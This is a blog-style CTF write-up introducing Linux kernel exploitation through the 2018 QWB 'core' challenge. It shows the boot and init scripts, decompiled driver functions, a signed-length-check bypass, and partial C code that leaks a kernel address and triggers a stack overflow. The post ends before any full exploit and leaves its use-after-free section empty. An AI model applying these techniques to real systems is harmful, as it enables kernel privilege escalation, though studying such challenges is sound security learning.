---
title: "Introduction of Kernel Exploitations"
date: 2022-05-16 19:09:21
tags: 
layout: default
---
# Prilogue
I only have little experience about kernel and kernel pwn. During the `Intro_to_OS` course, I read a lot kernel code of `xv6` and learned the kernel systematically. Algough, `xv6` is a simple system while the `linux` kernel is much more complex, the knowledge from `xv6` learned helps a lot.

This post would not go too deep in the kernel because I am too weak to do that and I got all the solution ideas from `ctf-wiki`. You can also download the attachments at this [link][1]
# Stack Overflow

In kernel, we also have stack overflow. But the exploitation is a little different from in user mode. There are kinds of countermeasures in kernel, such as `kaslr`, `smep`, `smap`. Besides, we need to come back to user mode after perform privilege eascaping. 

I'll start from a simple challenge and go through the expoit script to demostrate the steps in kernel exploitation. You can get the attachment at this [link][2].

## Kernel-ROP:2018-QWB-Core
For kernel challenge, we would like to start from the boot script, `start.sh`.
```sh
qemu-system-x86_64 \
-m 2G \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  

```

> Tips: Sometimes you need to change the memory limit for qemu vm to run the qemu vm, such as `-m 2G`

> Tips: If there are multi-cores, this challenge may be related to the race condition.

In this challenge on only have `kaslr`, which means there is no `smap` and `smep`. During the debugging, we can modify the boot script to trun of the kaslr(`... quiet nokaslr"`).

And I would check the `init` script in the file system.

```sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

It's also a script, which init the setting of challenge eviroment. As we can see, we can't read the symbol address in `/proc/kallsyms` and use `dmesg` to debug. However, all the symbols are copyied in `/tmp/kallsyms`(Line 9). Also, you can comment line 10-11 and change uid at line 18 to 0 while debugging.

After reviewing these scripts, we can start the reversing. There is nothing important in `init_module` and `exit_core` while in `core_ioctl` we have three functions. 

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
  __int64 result; // rax
  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF

  v2[8] = __readgsqword(0x28u);
  printk(&ss1);
  if ( a1 > 63 )
  {
    printk(&unk_2A1);
    return 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(v2, &name, (unsigned __int16)a1);
  }
  return result;
}
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  printk(&ss1);
  if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
    return (unsigned int)a3;
  printk(&ss2);
  return 4294967282LL;
}
```

The most important two functions are `core_copy_func` and `core_write`. We can use `write(fd,buf,0x800)` to fill the buffer `name` and use `core_copy_func` to trigger the buffer overflow because the buffer length is limited and the size is an interger so that we can use "-1" to bypass the check(`<0x40`).

The solution is simialr to the user space bof challenge's.
- Leak the kernel space address.
- Use `write` to copy the payload to the kernel space
- Use `ioctl` to call `core_copy_func` to trigger the buffer overflow
- Control RIP to perform later attacking

The leak part is simply because we can read arbitrary address by combining `ioctl(fd,OFF,off)` and `read`.
```c
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
    char buf[0x1000];
    memset(buf,0,0x1000);
    int fd = open("/proc/core",2);
    if(!fd>0)
        Panic("Open");
    // Leak the kernel address
    ioctl(fd,OFFSET,0x60);
    ioctl(fd,READ,buf);
    size_t leaked_address =  u64(buf);
    printf("%p\n",leaked_address);
    ...
```
And there is the asm code of `core_copy_func`
```asm
push    rbx
.text:00000000000000F7                 mov     rbx, rdi
.text:00000000000000FA                 mov     rdi, offset ss1 ; _QWORD
.text:0000000000000101                 sub     rsp, 48h
.text:0000000000000105                 mov     rax, gs:28h
.text:000000000000010E                 mov     [rsp+50h+var_10], rax
.text:0000000000000113                 xor     eax, eax
.text:0000000000000115                 call    printk
.text:000000000000011A                 cmp     rbx, 3Fh ; '?'
.text:000000000000011E                 jg      short loc_133

```
As we can see in the above asm code, the the `rdi` is compared to `0x3f`. There is a vulnerability in this check. Because it uses `jg` which means `rdi` is a `signed int`. Therefore, we can use some negtive number to bypass it. I wrote the following simple demo to trigger the bof.
```c
#define OFFSET  0x6677889C
#define READ    0x6677889B
#define OOB     0x6677889A
int main()
{
...
    memset(buf,1,0x1000);
    size_t poc = -1;
    ioctl(fd,OOB,poc);
}
```
If you debug this demo, you would find our negtive parameter bypasses the check. However, this demo can't hit the return because -1 is too large and some important data would be broken. 
```
.text:0000000000000120                 movzx   ecx, bx
.text:0000000000000123                 mov     rsi, offset name
.text:000000000000012A                 mov     rdi, rsp
.text:000000000000012D                 xor     eax, eax
.text:000000000000012F                 rep movsb
```
In above code, `bx` is moved to `ecx`. And `ecx` is used as the length to copy the data. Therefore we can make a better payload to avoid triggering the crash: `size_t poc = (1<<63) | 0x100`.

So our current task is construct a payload to get the shell. There are several feasible solutions in this challenge.

Because there is no `smep`, we can run implement the tasks in our user space rather than ROP. 



# Use after Free


# 


[1]: xxx
[2]: 